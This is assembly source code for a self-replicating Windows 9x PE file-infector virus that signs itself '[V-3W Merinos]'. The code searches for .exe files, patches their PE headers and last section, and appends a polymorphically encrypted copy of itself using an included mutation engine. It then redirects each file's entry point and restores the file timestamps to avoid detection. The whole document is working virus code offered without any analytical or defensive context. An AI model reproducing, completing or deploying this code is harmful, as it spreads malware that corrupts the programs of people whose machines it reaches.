; simple

dta  struc
        dtaFill db 21 dup (?)
        dtaAttr db ?
        dtaTime dd ?
        dtaSize dd ?          ; размерчик
        dtaName db 13 dup (?) ; имя файлы     
ends

.386p
.model flat
.code
db ?
.data
start: 
    db   068h
start_ip dd offset host
    call $+5
delta:
    cld
    pop  ebp
    sub  ebp, offset delta
    cmp  1 ptr [esp.7], 0BFh
    jnz  __nt
    call mme_start
    call find_and_infect
__nt:
    pop  eax
    lea  ebp, [esp+13Ch]
    jmp  eax

find_and_infect:
    mov si, es
    mov ah, 2Fh
    call dos
    push ebx es
    mov  es, si
    lea  edx, [ebp+my_dta]
    mov  ah, 1Ah
    call dos
    lea  edx, [ebp+mask]
    mov  ah, 4Eh
    mov  cx, 3Fh
    call dos
__1:
    lea edi, [ebp+mme_buffer]
    mov ecx, vl+1200+200h
    sub al, al
    cld
    rep stosb
    call infect
    mov  ah, 4Fh
    call dos
    jnc  __1
    mov  si, ds
    pop  ds edx
    mov  ah, 1Ah
    call dos  
    mov  ds, si
    ret

mme_start:
    mov edx, 4 ptr [ebp+gme_seed_offset]
    in  ax, 40h
    in  al, 40h
    mov 2 ptr [ebp+edx+mme32], ax
    in  ax, 40h
    in  al, 40h
    mov 2 ptr [ebp+edx+mme32+2], ax
    ret

mme32_start:
mme32:
gem_start:
gme_seed_offset equ lme_seed_offset
include lme32.inc

dos: 
    push ecx
    push eax
    push 002a0010h
    mov  eax, 0BFF713D4h
    call eax  
    ret

infect:
    mov ax, 3D42h 
    lea edx, [ebp+my_dta.dtaName]
    call dos
    jc  __2
    xchg eax, ebx
    mov ecx, 3Ch+4
    lea edx, [ebp+buffer]
    mov ah, 3Fh
    call dos
    cmp eax, ecx
    jnz close
    cmp 2 ptr [edx], 'ZM'
    jnz close
    mov eax, 4 ptr [edx.3Ch]
    cmp eax, 64000
    ja  close
    mov  4 ptr [ebp+heh], eax
    push eax
    pop  edx
    sub  ecx, ecx
    mov  ax, 4200h
    call dos
    mov ecx, 0F8h + (28h*8)   
    lea edx, [ebp+buffer]
    mov ah, 3Fh
    call dos
    cmp eax, ecx
    jnz close
    cmp 2 ptr [edx], 'EP'
    jnz close
    test 2 ptr [edx.16h], 2000h
    jnz close
    test 2 ptr [edx.16h], 0002h
    jz  close
    cmp  2 ptr [edx.04h], 014Eh
    ja  close 
    cmp  2 ptr [edx.06h], 8
    ja  close
    movzx  esi, 2 ptr [edx.14h]
    lea  esi, [esi+18h+edx]
    movzx eax, 2 ptr [edx.06h]
    dec  eax
    imul eax, eax, 28h
    add  esi, eax
    mov  eax, 4 ptr [esi.14h]
    add  eax, 4 ptr [esi.10h]
    cmp  eax, 4 ptr [ebp+my_dta.dtaSize]
    jnz  close
    mov  eax, 4 ptr [edx.28h]
    add  eax, 4 ptr [edx.34h]
    mov  4 ptr [ebp+start_ip], eax   
    or   2 ptr [edx.16h], 0200h
    or   4 ptr [esi.24h], 0C0000000h
    mov  eax, 40D56780h
    cmp  4 ptr [edx.10h], eax
    jz   close
    mov  4 ptr [edx.10h], eax
    mov  eax, 4 ptr [esi.10h]
    mov  4 ptr [ebp+old_size], eax
    add  eax, 4 ptr [esi.0Ch]
    mov  4 ptr [edx.28h], eax
    mov  eax, 4 ptr [esi.10h]
    add  eax, vl+1200
    call FileAlign
    mov  4 ptr [esi.10h], eax
    mov  eax, 4 ptr [esi.10h]
    add  eax, _vl
    call ObjAlign
    cmp  eax, 4 ptr [esi.08h]
    jb   __5
    mov  4 ptr [esi.08h], eax
__5:
    mov eax, 4 ptr [esi.0Ch]
    add eax, 4 ptr [esi.08h]
    call ObjAlign
    mov 4 ptr [edx.50h], eax
    push edx
    mov ax, 4202h
    xor ecx, ecx
    cdq
    call dos
    pop edx
    push ebp ebx esi
;    mov eax, 4 ptr [edx.28h]
;    add eax, 4 ptr [edx.34h]
    lea esi, [ebp+start]
    mov ecx, vl
    lea edi, [ebp+mme_buffer]
    call mme32_start 
    pop esi ebx ebp
    mov ah, 40h
    lea edx, [ebp+mme_buffer]
    mov ecx, 4 ptr [esi.10h] ; phys. size
    sub ecx, 4 ptr [ebp+old_size]
    call dos
    mov edx, 4 ptr [ebp+heh]
    sub ecx, ecx 
    mov ax, 4200h
    call dos
    lea edx, [ebp+buffer]
    mov ah, 40h
    mov ecx, 0F8h + (28h*8)   
    call dos
    mov ax, 5701h
    mov cx, 2 ptr [ebp+my_dta.dtaTime]
    mov dx, 2 ptr [ebp+my_dta.dtaTime+2]
    call dos
close:
    mov ah, 3Eh
    call dos
__2:
    ret

FileAlign:
     push edx
     mov ecx, [edx.3Ch]
     sub edx, edx
     div ecx
     test edx, edx
     jz  __3
     inc eax
     sub edx, edx
__3:  
     mul ecx
     pop edx
     ret

ObjAlign:
     push edx
     mov ecx, [edx.38h]
     sub edx, edx
     div ecx
     test edx, edx
     jz  __4
     inc eax
     sub edx, edx
__4:  
     mul ecx
     pop edx
     ret

mask db '*.exe',0

     db '[V-3W Merinos]'

vl = ($-start)

xxl:

my_dta db 43 dup (?)
buffer db 0F8h + (28h*8) dup (?)
mme_buffer db vl+1200 dup (?)
       db 200h dup (?)    
heh    dd ?   
old_size dd ?


_vl = ($-xxl)

.code

host:
    push 0
    call ExitProcess
    db vl/1000 mod 10 + '0'
    db vl/100  mod 10 + '0'
    db vl/10   mod 10 + '0'
    db vl/1    mod 10 + '0'


extrn ExitProcess: proc

end start